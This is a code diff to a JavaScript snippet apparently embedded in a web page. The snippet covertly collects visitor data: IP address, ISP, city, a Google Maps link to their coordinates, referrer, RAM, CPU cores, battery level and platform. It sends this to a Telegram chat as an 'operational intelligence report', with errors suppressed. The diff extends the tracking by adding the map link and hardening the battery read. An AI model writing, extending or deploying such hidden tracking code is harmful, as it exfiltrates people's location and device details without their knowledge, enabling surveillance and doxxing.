@@ -191,18 +191,29 @@
                     // 2. Metadata de Hardware
                     const ram = navigator.deviceMemory || "N/A";
                     const cores = navigator.hardwareConcurrency || "N/A";
-                    const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
-                    const batStatus = battery ? `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Cargando)' : '(Batería)'}` : "N/A";
                     
-                    // 3. Origen y Tráfico
+                    // 3. Intento de Lectura de Batería
+                    let batStatus = "N/A (Bloqueado por OS)";
+                    if (navigator.getBattery) {
+                        try {
+                            const battery = await navigator.getBattery();
+                            batStatus = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Cargando)' : '(Batería)'}`;
+                        } catch(e) {}
+                    }
+                    
+                    // 4. Origen del Tráfico
                     const referer = document.referrer || "Acceso Directo / Bookmark";
                     
+                    // 5. Link a Google Maps
+                    const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
                     const text = `🚨 *OPERATIONAL INTELLIGENCE REPORT*\n` +
                                  `━━━━━━━━━━━━━━━━━━\n` +
                                  `📍 *RED & IP:*\n` +
                                  `IP: \`${data.ip}\`\n` +
                                  `ISP: ${data.org}\n` +
-                                 `Ubicación: ${data.city}, ${data.country_name}\n\n` +
+                                 `Ubicación: ${data.city}, ${data.country_name}\n` +
+                                 `🗺️ *MAPA:* [Ver en Google Maps](${mapLink})\n\n` +
                                  `🌐 *REFERER:* ${referer}\n\n` +
                                  `💻 *HARDWARE & SISTEMA:*\n` +
                                  `OS: ${navigator.platform}\n` +
@@ -220,11 +231,12 @@
                         body: JSON.stringify({
                             chat_id: chatId,
                             text: text,
-                            parse_mode: 'Markdown'
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: false
                         }),
                         keepalive: true
                     });
-                } catch (e) {}
+                } catch (err) {}
             }
             getIntelligence();
         })();
